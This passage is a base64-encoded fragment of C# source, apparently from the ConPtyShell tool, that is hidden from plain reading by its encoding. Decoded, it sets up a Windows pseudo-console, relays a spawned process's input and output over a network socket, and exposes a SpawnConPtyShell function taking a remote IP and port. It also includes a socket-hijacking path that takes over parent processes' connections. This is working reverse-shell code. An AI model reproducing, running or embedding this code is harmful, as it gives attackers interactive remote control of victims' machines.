CAgICBTZXRTdGRIYW5kbGUoU1REX09VVFBVVF9IQU5ETEUsIG9sZFN0ZE91dCk7CiAgICAgICAgU2V0U3RkSGFuZGxlKFNURF9FUlJPUl9IQU5ETEUsIG9sZFN0ZEVycik7CiAgICAgICAgU2V0U3RkSGFuZGxlKFNURF9JTlBVVF9IQU5ETEUsIG9sZFN0ZEluKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIEVuYWJsZVZpcnR1YWxUZXJtaW5hbFNlcXVlbmNlUHJvY2Vzc2luZygpCiAgICB7CiAgICAgICAgdWludCBvdXRDb25zb2xlTW9kZSA9IDA7CiAgICAgICAgSW50UHRyIGhTdGRPdXQgPSBHZXRTdGRIYW5kbGUoU1REX09VVFBVVF9IQU5ETEUpOwogICAgICAgIGlmICghR2V0Q29uc29sZU1vZGUoaFN0ZE91dCwgb3V0IG91dENvbnNvbGVNb2RlKSkKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IGdldCBjb25zb2xlIG1vZGUiKTsKICAgICAgICB9CiAgICAgICAgb3V0Q29uc29sZU1vZGUgfD0gRU5BQkxFX1ZJUlRVQUxfVEVSTUlOQUxfUFJPQ0VTU0lORyB8IERJU0FCTEVfTkVXTElORV9BVVRPX1JFVFVSTjsKICAgICAgICBpZiAoIVNldENvbnNvbGVNb2RlKGhTdGRPdXQsIG91dENvbnNvbGVNb2RlKSkKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IGVuYWJsZSB2aXJ0dWFsIHRlcm1pbmFsIHByb2Nlc3NpbmciKTsKICAgICAgICB9CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgaW50IENyZWF0ZVBzZXVkb0NvbnNvbGVXaXRoUGlwZXMocmVmIEludFB0ciBoYW5kbGVQc2V1ZG9Db25zb2xlLCByZWYgSW50UHRyIENvblB0eUlucHV0UGlwZVJlYWQsIHJlZiBJbnRQdHIgQ29uUHR5T3V0cHV0UGlwZVdyaXRlLCB1aW50IHJvd3MsIHVpbnQgY29scykKICAgIHsKICAgICAgICBpbnQgcmVzdWx0ID0gLTE7CiAgICAgICAgRW5hYmxlVmlydHVhbFRlcm1pbmFsU2VxdWVuY2VQcm9jZXNzaW5nKCk7CiAgICAgICAgQ09PUkQgY29uc29sZUNvb3JkID0gbmV3IENPT1JEKCk7CiAgICAgICAgY29uc29sZUNvb3JkLlggPSAoc2hvcnQpY29sczsKICAgICAgICBjb25zb2xlQ29vcmQuWSA9IChzaG9ydClyb3dzOwogICAgICAgIHJlc3VsdCA9IENyZWF0ZVBzZXVkb0NvbnNvbGUoY29uc29sZUNvb3JkLCBDb25QdHlJbnB1dFBpcGVSZWFkLCBDb25QdHlPdXRwdXRQaXBlV3JpdGUsIDAsIG91dCBoYW5kbGVQc2V1ZG9Db25zb2xlKTsKICAgICAgICByZXR1cm4gcmVzdWx0OwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFNUQVJUVVBJTkZPRVggQ29uZmlndXJlUHJvY2Vzc1RocmVhZChJbnRQdHIgaGFuZGxlUHNldWRvQ29uc29sZSwgSW50UHRyIGF0dHJpYnV0ZXMpCiAgICB7CiAgICAgICAgSW50UHRyIGxwU2l6ZSA9IEludFB0ci5aZXJvOwogICAgICAgIGJvb2wgc3VjY2VzcyA9IEluaXRpYWxpemVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdChJbnRQdHIuWmVybywgMSwgMCwgcmVmIGxwU2l6ZSk7CiAgICAgICAgaWYgKHN1Y2Nlc3MgfHwgbHBTaXplID09IEludFB0ci5aZXJvKQogICAgICAgIHsKICAgICAgICAgICAgdGhyb3cgbmV3IENvblB0eVNoZWxsRXhjZXB0aW9uKCJDb3VsZCBub3QgY2FsY3VsYXRlIHRoZSBudW1iZXIgb2YgYnl0ZXMgZm9yIHRoZSBhdHRyaWJ1dGUgbGlzdC4gIiArIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSk7CiAgICAgICAgfQogICAgICAgIFNUQVJUVVBJTkZPRVggc3RhcnR1cEluZm8gPSBuZXcgU1RBUlRVUElORk9FWCgpOwogICAgICAgIHN0YXJ0dXBJbmZvLlN0YXJ0dXBJbmZvLmNiID0gTWFyc2hhbC5TaXplT2Yoc3RhcnR1cEluZm8pOwogICAgICAgIHN0YXJ0dXBJbmZvLmxwQXR0cmlidXRlTGlzdCA9IE1hcnNoYWwuQWxsb2NIR2xvYmFsKGxwU2l6ZSk7CiAgICAgICAgc3VjY2VzcyA9IEluaXRpYWxpemVQcm9jVGhyZWFkQXR0cmlidXRlTGlzdChzdGFydHVwSW5mby5scEF0dHJpYnV0ZUxpc3QsIDEsIDAsIHJlZiBscFNpemUpOwogICAgICAgIGlmICghc3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IHNldCB1cCBhdHRyaWJ1dGUgbGlzdC4gIiArIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSk7CiAgICAgICAgfQogICAgICAgIHN1Y2Nlc3MgPSBVcGRhdGVQcm9jVGhyZWFkQXR0cmlidXRlKHN0YXJ0dXBJbmZvLmxwQXR0cmlidXRlTGlzdCwgMCwgYXR0cmlidXRlcywgaGFuZGxlUHNldWRvQ29uc29sZSwgKEludFB0cilJbnRQdHIuU2l6ZSwgSW50UHRyLlplcm8sIEludFB0ci5aZXJvKTsKICAgICAgICBpZiAoIXN1Y2Nlc3MpCiAgICAgICAgewogICAgICAgICAgICB0aHJvdyBuZXcgQ29uUHR5U2hlbGxFeGNlcHRpb24oIkNvdWxkIG5vdCBzZXQgcHNldWRvY29uc29sZSB0aHJlYWQgYXR0cmlidXRlLiAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHN0YXJ0dXBJbmZvOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFBST0NFU1NfSU5GT1JNQVRJT04gUnVuUHJvY2VzcyhyZWYgU1RBUlRVUElORk9FWCBzSW5mb0V4LCBzdHJpbmcgY29tbWFuZExpbmUpCiAgICB7CiAgICAgICAgUFJPQ0VTU19JTkZPUk1BVElPTiBwSW5mbyA9IG5ldyBQUk9DRVNTX0lORk9STUFUSU9OKCk7CiAgICAgICAgU0VDVVJJVFlfQVRUUklCVVRFUyBwU2VjID0gbmV3IFNFQ1VSSVRZX0FUVFJJQlVURVMoKTsKICAgICAgICBpbnQgc2VjdXJpdHlBdHRyaWJ1dGVTaXplID0gTWFyc2hhbC5TaXplT2YocFNlYyk7CiAgICAgICAgcFNlYy5uTGVuZ3RoID0gc2VjdXJpdHlBdHRyaWJ1dGVTaXplOwogICAgICAgIFNFQ1VSSVRZX0FUVFJJQlVURVMgdFNlYyA9IG5ldyBTRUNVUklUWV9BVFRSSUJVVEVTKCk7CiAgICAgICAgdFNlYy5uTGVuZ3RoID0gc2VjdXJpdHlBdHRyaWJ1dGVTaXplOwogICAgICAgIGJvb2wgc3VjY2VzcyA9IENyZWF0ZVByb2Nlc3NFeChudWxsLCBjb21tYW5kTGluZSwgcmVmIHBTZWMsIHJlZiB0U2VjLCBmYWxzZSwgRVhURU5ERURfU1RBUlRVUElORk9fUFJFU0VOVCwgSW50UHRyLlplcm8sIG51bGwsIHJlZiBzSW5mb0V4LCBvdXQgcEluZm8pOwogICAgICAgIGlmICghc3VjY2VzcykKICAgICAgICB7CiAgICAgICAgICAgIHRocm93IG5ldyBDb25QdHlTaGVsbEV4Y2VwdGlvbigiQ291bGQgbm90IGNyZWF0ZSBwcm9jZXNzLiAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICB9CiAgICAgICAgcmV0dXJuIHBJbmZvOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFBST0NFU1NfSU5GT1JNQVRJT04gQ3JlYXRlQ2hpbGRQcm9jZXNzV2l0aFBzZXVkb0NvbnNvbGUoSW50UHRyIGhhbmRsZVBzZXVkb0NvbnNvbGUsIHN0cmluZyBjb21tYW5kTGluZSkKICAgIHsKICAgICAgICBTVEFSVFVQSU5GT0VYIHN0YXJ0dXBJbmZvID0gQ29uZmlndXJlUHJvY2Vzc1RocmVhZChoYW5kbGVQc2V1ZG9Db25zb2xlLCAoSW50UHRyKVBST0NfVEhSRUFEX0FUVFJJQlVURV9QU0VVRE9DT05TT0xFKTsKICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIHByb2Nlc3NJbmZvID0gUnVuUHJvY2VzcyhyZWYgc3RhcnR1cEluZm8sIGNvbW1hbmRMaW5lKTsKICAgICAgICByZXR1cm4gcHJvY2Vzc0luZm87CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0T3ZlcmxhcHBlZChvYmplY3QgdGhyZWFkUGFyYW1zKQogICAgewogICAgICAgIG9iamVjdFtdIHRocmVhZFBhcmFtZXRlcnMgPSAob2JqZWN0W10pdGhyZWFkUGFyYW1zOwogICAgICAgIEludFB0ciBPdXRwdXRQaXBlUmVhZCA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1swXTsKICAgICAgICBJbnRQdHIgc2hlbGxTb2NrZXQgPSAoSW50UHRyKXRocmVhZFBhcmFtZXRlcnNbMV07CiAgICAgICAgaW50IGJ1ZmZlclNpemUgPSA4MTkyOwogICAgICAgIGJvb2wgcmVhZFN1Y2Nlc3MgPSBmYWxzZTsKICAgICAgICBJbnQzMiBieXRlc1NlbnQgPSAwOwogICAgICAgIHVpbnQgZHdCeXRlc1JlYWQgPSAwOwogICAgICAgIGRvCiAgICAgICAgewogICAgICAgICAgICBieXRlW10gYnl0ZXNUb1dyaXRlID0gbmV3IGJ5dGVbYnVmZmVyU2l6ZV07CiAgICAgICAgICAgIHJlYWRTdWNjZXNzID0gUmVhZEZpbGUoT3V0cHV0UGlwZVJlYWQsIGJ5dGVzVG9Xcml0ZSwgKHVpbnQpYnVmZmVyU2l6ZSwgb3V0IGR3Qnl0ZXNSZWFkLCBJbnRQdHIuWmVybyk7CiAgICAgICAgICAgIGJ5dGVzU2VudCA9IHNlbmQoc2hlbGxTb2NrZXQsIGJ5dGVzVG9Xcml0ZSwgKGludClkd0J5dGVzUmVhZCwgMCk7CiAgICAgICAgfSB3aGlsZSAoYnl0ZXNTZW50ID4gMCAmJiByZWFkU3VjY2Vzcyk7CiAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnOiBieXRlc1NlbnQgPSAiICsgYnl0ZXNTZW50ICsgIiBXU0FHZXRMYXN0RXJyb3IoKSA9ICIgKyBXU0FHZXRMYXN0RXJyb3IoKS5Ub1N0cmluZygpKTsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXROb25PdmVybGFwcGVkKG9iamVjdCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgb2JqZWN0W10gdGhyZWFkUGFyYW1ldGVycyA9IChvYmplY3RbXSl0aHJlYWRQYXJhbXM7CiAgICAgICAgSW50UHRyIE91dHB1dFBpcGVSZWFkID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzBdOwogICAgICAgIEludFB0ciBzaGVsbFNvY2tldCA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1sxXTsKICAgICAgICBpbnQgYnVmZmVyU2l6ZSA9IDgxOTI7CiAgICAgICAgYm9vbCByZWFkU3VjY2VzcyA9IGZhbHNlOwogICAgICAgIEludDMyIGJ5dGVzU2VudCA9IDA7CiAgICAgICAgdWludCBkd0J5dGVzUmVhZCA9IDA7CiAgICAgICAgZG8KICAgICAgICB7CiAgICAgICAgICAgIGJ5dGVbXSBieXRlc1RvV3JpdGUgPSBuZXcgYnl0ZVtidWZmZXJTaXplXTsKICAgICAgICAgICAgcmVhZFN1Y2Nlc3MgPSBSZWFkRmlsZShPdXRwdXRQaXBlUmVhZCwgYnl0ZXNUb1dyaXRlLCAodWludClidWZmZXJTaXplLCBvdXQgZHdCeXRlc1JlYWQsIEludFB0ci5aZXJvKTsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnIFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQgUmVhZEZpbGU6IGR3Qnl0ZXNSZWFkID0gIiArIGR3Qnl0ZXNSZWFkICsgIiBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkgIiArIE1hcnNoYWwuR2V0TGFzdFdpbjMyRXJyb3IoKSk7CiAgICAgICAgICAgIGRvCiAgICAgICAgICAgIHsKICAgICAgICAgICAgICAgIGJ5dGVzU2VudCA9IHNlbmQoc2hlbGxTb2NrZXQsIGJ5dGVzVG9Xcml0ZSwgKGludClkd0J5dGVzUmVhZCwgMCk7CiAgICAgICAgICAgICAgICAvLyBDb25zb2xlLldyaXRlTGluZSgiZGVidWcgVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldCBzZW5kOiBieXRlc1NlbnQgPSAiICsgYnl0ZXNTZW50ICsgIiBXU0FHZXRMYXN0RXJyb3IoKSA9ICIgKyBXU0FHZXRMYXN0RXJyb3IoKS5Ub1N0cmluZygpKTsKICAgICAgICAgICAgfSB3aGlsZSAoV1NBR2V0TGFzdEVycm9yKCkgPT0gV1NBRVdPVUxEQkxPQ0spOwogICAgICAgIH0gd2hpbGUgKGJ5dGVzU2VudCA+IDAgJiYgcmVhZFN1Y2Nlc3MpOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFRocmVhZCBTdGFydFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQoSW50UHRyIE91dHB1dFBpcGVSZWFkLCBJbnRQdHIgc2hlbGxTb2NrZXQsIGJvb2wgb3ZlcmxhcHBlZFNvY2tldCkKICAgIHsKICAgICAgICBvYmplY3RbXSB0aHJlYWRQYXJhbWV0ZXJzID0gbmV3IG9iamVjdFsyXTsKICAgICAgICB0aHJlYWRQYXJhbWV0ZXJzWzBdID0gT3V0cHV0UGlwZVJlYWQ7CiAgICAgICAgdGhyZWFkUGFyYW1ldGVyc1sxXSA9IHNoZWxsU29ja2V0OwogICAgICAgIFRocmVhZCB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQ7CiAgICAgICAgaWYob3ZlcmxhcHBlZFNvY2tldCkKICAgICAgICAgICAgdGhUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0ID0gbmV3IFRocmVhZChUaHJlYWRSZWFkUGlwZVdyaXRlU29ja2V0T3ZlcmxhcHBlZCk7CiAgICAgICAgZWxzZQogICAgICAgICAgICB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQgPSBuZXcgVGhyZWFkKFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXROb25PdmVybGFwcGVkKTsKICAgICAgICB0aFRocmVhZFJlYWRQaXBlV3JpdGVTb2NrZXQuU3RhcnQodGhyZWFkUGFyYW1ldGVycyk7CiAgICAgICAgcmV0dXJuIHRoVGhyZWFkUmVhZFBpcGVXcml0ZVNvY2tldDsKICAgIH0KCiAgICBwcml2YXRlIHN0YXRpYyB2b2lkIFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGVPdmVybGFwcGVkKG9iamVjdCB0aHJlYWRQYXJhbXMpCiAgICB7CiAgICAgICAgb2JqZWN0W10gdGhyZWFkUGFyYW1ldGVycyA9IChvYmplY3RbXSl0aHJlYWRQYXJhbXM7CiAgICAgICAgSW50UHRyIElucHV0UGlwZVdyaXRlID0gKEludFB0cil0aHJlYWRQYXJhbWV0ZXJzWzBdOwogICAgICAgIEludFB0ciBzaGVsbFNvY2tldCA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1sxXTsKICAgICAgICBJbnRQdHIgaENoaWxkUHJvY2VzcyA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1syXTsKICAgICAgICBpbnQgYnVmZmVyU2l6ZSA9IDgxOTI7CiAgICAgICAgYm9vbCB3cml0ZVN1Y2Nlc3MgPSBmYWxzZTsKICAgICAgICBJbnQzMiBuQnl0ZXNSZWNlaXZlZCA9IDA7CiAgICAgICAgdWludCBieXRlc1dyaXR0ZW4gPSAwOwogICAgICAgIGRvCiAgICAgICAgewogICAgICAgICAgICBieXRlW10gYnl0ZXNSZWNlaXZlZCA9IG5ldyBieXRlW2J1ZmZlclNpemVdOwogICAgICAgICAgICBuQnl0ZXNSZWNlaXZlZCA9IHJlY3Yoc2hlbGxTb2NrZXQsIGJ5dGVzUmVjZWl2ZWQsIGJ1ZmZlclNpemUsIDApOwogICAgICAgICAgICB3cml0ZVN1Y2Nlc3MgPSBXcml0ZUZpbGUoSW5wdXRQaXBlV3JpdGUsIGJ5dGVzUmVjZWl2ZWQsICh1aW50KW5CeXRlc1JlY2VpdmVkLCBvdXQgYnl0ZXNXcml0dGVuLCBJbnRQdHIuWmVybyk7CiAgICAgICAgfSB3aGlsZSAobkJ5dGVzUmVjZWl2ZWQgPiAwICYmIHdyaXRlU3VjY2Vzcyk7CiAgICAgICAgLy8gIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogbkJ5dGVzUmVjZWl2ZWQgPSAiICsgbkJ5dGVzUmVjZWl2ZWQgKyAiIFdTQUdldExhc3RFcnJvcigpID0gIiArIFdTQUdldExhc3RFcnJvcigpLlRvU3RyaW5nKCkpOwogICAgICAgIFRlcm1pbmF0ZVByb2Nlc3MoaENoaWxkUHJvY2VzcywgMCk7CiAgICB9CgogICAgcHJpdmF0ZSBzdGF0aWMgdm9pZCBUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlTm9uT3ZlcmxhcHBlZChvYmplY3QgdGhyZWFkUGFyYW1zKQogICAgewogICAgICAgIG9iamVjdFtdIHRocmVhZFBhcmFtZXRlcnMgPSAob2JqZWN0W10pdGhyZWFkUGFyYW1zOwogICAgICAgIEludFB0ciBJbnB1dFBpcGVXcml0ZSA9IChJbnRQdHIpdGhyZWFkUGFyYW1ldGVyc1swXTsKICAgICAgICBJbnRQdHIgc2hlbGxTb2NrZXQgPSAoSW50UHRyKXRocmVhZFBhcmFtZXRlcnNbMV07CiAgICAgICAgSW50UHRyIGhDaGlsZFByb2Nlc3MgPSAoSW50UHRyKXRocmVhZFBhcmFtZXRlcnNbMl07CiAgICAgICAgaW50IGJ1ZmZlclNpemUgPSA4MTkyOwogICAgICAgIGJvb2wgd3JpdGVTdWNjZXNzID0gZmFsc2U7CiAgICAgICAgSW50MzIgbkJ5dGVzUmVjZWl2ZWQgPSAwOwogICAgICAgIHVpbnQgYnl0ZXNXcml0dGVuID0gMDsKICAgICAgICBib29sIHNvY2tldEJsb2NraW5nT3BlcmF0aW9uID0gZmFsc2U7CiAgICAgICAgSW50UHRyIHdzYVJlYWRFdmVudCA9IFdTQUNyZWF0ZUV2ZW50KCk7CiAgICAgICAgLy8gd2UgZXhwZWN0IHRoZSBzb2NrZXQgdG8gYmUgbm9uLWJsb2NraW5nIGF0IHRoaXMgcG9pbnQuIHdlIGNyZWF0ZSBhbiBhc3luY2ggZXZlbnQgdG8gYmUgc2lnbmFsZWQgd2hlbiB0aGUgcmVjdiBvcGVyYXRpb24gaXMgcmVhZHkgdG8gZ2V0IHNvbWUgZGF0YQogICAgICAgIFdTQUV2ZW50U2VsZWN0KHNoZWxsU29ja2V0LCB3c2FSZWFkRXZlbnQsIEZEX1JFQUQpOwogICAgICAgIEludFB0cltdIHdzYUV2ZW50c0FycmF5ID0gbmV3IEludFB0cltdIHsgd3NhUmVhZEV2ZW50IH07CiAgICAgICAgZG8KICAgICAgICB7CiAgICAgICAgICAgIGJ5dGVbXSBieXRlc1JlY2VpdmVkID0gbmV3IGJ5dGVbYnVmZmVyU2l6ZV07CiAgICAgICAgICAgIFdTQVdhaXRGb3JNdWx0aXBsZUV2ZW50cyh3c2FFdmVudHNBcnJheS5MZW5ndGgsIHdzYUV2ZW50c0FycmF5LCB0cnVlLCA1MDAsIGZhbHNlKTsKICAgICAgICAgICAgbkJ5dGVzUmVjZWl2ZWQgPSByZWN2KHNoZWxsU29ja2V0LCBieXRlc1JlY2VpdmVkLCBidWZmZXJTaXplLCAwKTsKICAgICAgICAgICAgLy8gd2Ugc3RpbGwgY2hlY2sgV1NBRVdPVUxEQkxPQ0sgZm9yIGEgbW9yZSByb2J1c3QgaW1wbGVtZW50YXRpb24KICAgICAgICAgICAgaWYgKFdTQUdldExhc3RFcnJvcigpID09IFdTQUVXT1VMREJMT0NLKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBzb2NrZXRCbG9ja2luZ09wZXJhdGlvbiA9IHRydWU7CiAgICAgICAgICAgICAgICBjb250aW51ZTsKICAgICAgICAgICAgfQogICAgICAgICAgICBXU0FSZXNldEV2ZW50KHdzYVJlYWRFdmVudCk7CiAgICAgICAgICAgIHNvY2tldEJsb2NraW5nT3BlcmF0aW9uID0gZmFsc2U7CiAgICAgICAgICAgIC8vIENvbnNvbGUuV3JpdGVMaW5lKCJkZWJ1ZzogVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZSByZWN2OiBuQnl0ZXNSZWNlaXZlZCA9ICIgKyBuQnl0ZXNSZWNlaXZlZCArICIgV1NBR2V0TGFzdEVycm9yKCkgPSAiICsgV1NBR2V0TGFzdEVycm9yKCkuVG9TdHJpbmcoKSk7CiAgICAgICAgICAgIHdyaXRlU3VjY2VzcyA9IFdyaXRlRmlsZShJbnB1dFBpcGVXcml0ZSwgYnl0ZXNSZWNlaXZlZCwgKHVpbnQpbkJ5dGVzUmVjZWl2ZWQsIG91dCBieXRlc1dyaXR0ZW4sIEludFB0ci5aZXJvKTsKICAgICAgICAgICAgLy8gQ29uc29sZS5Xcml0ZUxpbmUoImRlYnVnIFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGUgV3JpdGVGaWxlOiBieXRlc1dyaXR0ZW4gPSAiICsgYnl0ZXNXcml0dGVuICsgIiBNYXJzaGFsLkdldExhc3RXaW4zMkVycm9yKCkgPSAiICsgTWFyc2hhbC5HZXRMYXN0V2luMzJFcnJvcigpKTsKICAgICAgICB9IHdoaWxlIChzb2NrZXRCbG9ja2luZ09wZXJhdGlvbiB8fCAobkJ5dGVzUmVjZWl2ZWQgPiAwICYmIHdyaXRlU3VjY2VzcykpOwogICAgICAgIFdTQUNsb3NlRXZlbnQod3NhUmVhZEV2ZW50KTsKICAgICAgICBUZXJtaW5hdGVQcm9jZXNzKGhDaGlsZFByb2Nlc3MsIDApOwogICAgfQoKICAgIHByaXZhdGUgc3RhdGljIFRocmVhZCBTdGFydFRocmVhZFJlYWRTb2NrZXRXcml0ZVBpcGUoSW50UHRyIElucHV0UGlwZVdyaXRlLCBJbnRQdHIgc2hlbGxTb2NrZXQsIEludFB0ciBoQ2hpbGRQcm9jZXNzLCBib29sIG92ZXJsYXBwZWRTb2NrZXQpCiAgICB7CiAgICAgICAgb2JqZWN0W10gdGhyZWFkUGFyYW1ldGVycyA9IG5ldyBvYmplY3RbM107CiAgICAgICAgdGhyZWFkUGFyYW1ldGVyc1swXSA9IElucHV0UGlwZVdyaXRlOwogICAgICAgIHRocmVhZFBhcmFtZXRlcnNbMV0gPSBzaGVsbFNvY2tldDsKICAgICAgICB0aHJlYWRQYXJhbWV0ZXJzWzJdID0gaENoaWxkUHJvY2VzczsKICAgICAgICBUaHJlYWQgdGhSZWFkU29ja2V0V3JpdGVQaXBlOwogICAgICAgIGlmKG92ZXJsYXBwZWRTb2NrZXQpCiAgICAgICAgICAgIHRoUmVhZFNvY2tldFdyaXRlUGlwZSA9IG5ldyBUaHJlYWQoVGhyZWFkUmVhZFNvY2tldFdyaXRlUGlwZU92ZXJsYXBwZWQpOwogICAgICAgIGVsc2UKICAgICAgICAgICAgdGhSZWFkU29ja2V0V3JpdGVQaXBlID0gbmV3IFRocmVhZChUaHJlYWRSZWFkU29ja2V0V3JpdGVQaXBlTm9uT3ZlcmxhcHBlZCk7CiAgICAgICAgdGhSZWFkU29ja2V0V3JpdGVQaXBlLlN0YXJ0KHRocmVhZFBhcmFtZXRlcnMpOwogICAgICAgIHJldHVybiB0aFJlYWRTb2NrZXRXcml0ZVBpcGU7CiAgICB9CgogICAgcHVibGljIHN0YXRpYyBzdHJpbmcgU3Bhd25Db25QdHlTaGVsbChzdHJpbmcgcmVtb3RlSXAsIGludCByZW1vdGVQb3J0LCB1aW50IHJvd3MsIHVpbnQgY29scywgc3RyaW5nIGNvbW1hbmRMaW5lLCBib29sIHVwZ3JhZGVTaGVsbCkKICAgIHsKICAgICAgICBJbnRQdHIgc2hlbGxTb2NrZXQgPSBJbnRQdHIuWmVybzsKICAgICAgICBJbnRQdHIgSW5wdXRQaXBlUmVhZCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBJbnB1dFBpcGVXcml0ZSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBPdXRwdXRQaXBlUmVhZCA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBPdXRwdXRQaXBlV3JpdGUgPSBJbnRQdHIuWmVybzsKICAgICAgICBJbnRQdHIgaGFuZGxlUHNldWRvQ29uc29sZSA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBvbGRTdGRJbiA9IEludFB0ci5aZXJvOwogICAgICAgIEludFB0ciBvbGRTdGRPdXQgPSBJbnRQdHIuWmVybzsKICAgICAgICBJbnRQdHIgb2xkU3RkRXJyID0gSW50UHRyLlplcm87CiAgICAgICAgYm9vbCBuZXdDb25zb2xlQWxsb2NhdGVkID0gZmFsc2U7CiAgICAgICAgYm9vbCBwYXJlbnRTb2NrZXRJbmhlcml0ZWQgPSBmYWxzZTsKICAgICAgICBib29sIGdyYW5kUGFyZW50U29ja2V0SW5oZXJpdGVkID0gZmFsc2U7CiAgICAgICAgYm9vbCBjb25wdHlDb21wYXRpYmxlID0gZmFsc2U7CiAgICAgICAgYm9vbCBJc1NvY2tldE92ZXJsYXBwZWQgPSB0cnVlOwogICAgICAgIHN0cmluZyBvdXRwdXQgPSAiIjsKICAgICAgICBQcm9jZXNzIGN1cnJlbnRQcm9jZXNzID0gbnVsbDsKICAgICAgICBQcm9jZXNzIHBhcmVudFByb2Nlc3MgPSBudWxsOwogICAgICAgIFByb2Nlc3MgZ3JhbmRQYXJlbnRQcm9jZXNzID0gbnVsbDsKICAgICAgICBpZiAoR2V0UHJvY0FkZHJlc3MoR2V0TW9kdWxlSGFuZGxlKCJrZXJuZWwzMiIpLCAiQ3JlYXRlUHNldWRvQ29uc29sZSIpICE9IEludFB0ci5aZXJvKQogICAgICAgICAgICBjb25wdHlDb21wYXRpYmxlID0gdHJ1ZTsKICAgICAgICBQUk9DRVNTX0lORk9STUFUSU9OIGNoaWxkUHJvY2Vzc0luZm8gPSBuZXcgUFJPQ0VTU19JTkZPUk1BVElPTigpOwogICAgICAgIENyZWF0ZVBpcGVzKHJlZiBJbnB1dFBpcGVSZWFkLCByZWYgSW5wdXRQaXBlV3JpdGUsIHJlZiBPdXRwdXRQaXBlUmVhZCwgcmVmIE91dHB1dFBpcGVXcml0ZSk7CiAgICAgICAgLy8gY29tbWVudCB0aGUgYmVsb3cgZnVuY3Rpb24gdG8gZGVidWcgZXJyb3JzCiAgICAgICAgSW5pdENvbnNvbGUocmVmIG9sZFN0ZEluLCByZWYgb2xkU3RkT3V0LCByZWYgb2xkU3RkRXJyKTsKICAgICAgICAvLyBpbml0IHdzYXN0YXJ0dXAgc3R1ZmYgZm9yIHRoaXMgdGhyZWFkCiAgICAgICAgSW5pdFdTQVRocmVhZCgpOwogICAgICAgIGlmIChjb25wdHlDb21wYXRpYmxlKQogICAgICAgIHsKICAgICAgICAgICAgQ29uc29sZS5Xcml0ZUxpbmUoIlxyXG5DcmVhdGVQc2V1ZG9Db25zb2xlIGZ1bmN0aW9uIGZvdW5kISBTcGF3bmluZyBhIGZ1bGx5IGludGVyYWN0aXZlIHNoZWxsXHJcbiIpOwogICAgICAgICAgICBpZiAodXBncmFkZVNoZWxsKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICBMaXN0PEludFB0cj4gc29ja2V0c0hhbmRsZXMgPSBuZXcgTGlzdDxJbnRQdHI+KCk7CiAgICAgICAgICAgICAgICBjdXJyZW50UHJvY2VzcyA9IFByb2Nlc3MuR2V0Q3VycmVudFByb2Nlc3MoKTsKICAgICAgICAgICAgICAgIHBhcmVudFByb2Nlc3MgPSBQYXJlbnRQcm9jZXNzVXRpbGl0aWVzLkdldFBhcmVudFByb2Nlc3MoY3VycmVudFByb2Nlc3MuSGFuZGxlKTsKICAgICAgICAgICAgICAgIGlmIChwYXJlbnRQcm9jZXNzICE9IG51bGwpIGdyYW5kUGFyZW50UHJvY2VzcyA9IFBhcmVudFByb2Nlc3NVdGlsaXRpZXMuR2V0UGFyZW50UHJvY2VzcyhwYXJlbnRQcm9jZXNzLkhhbmRsZSk7CiAgICAgICAgICAgICAgICAvLyB0cnkgdG8gZHVwbGljYXRlIHRoZSBzb2NrZXQgZm9yIHRoZSBjdXJyZW50IHByb2Nlc3MKICAgICAgICAgICAgICAgIHNoZWxsU29ja2V0ID0gU29ja2V0SGlqYWNraW5nLkR1cGxpY2F0ZVRhcmdldFByb2Nlc3NTb2NrZXQoY3VycmVudFByb2Nlc3M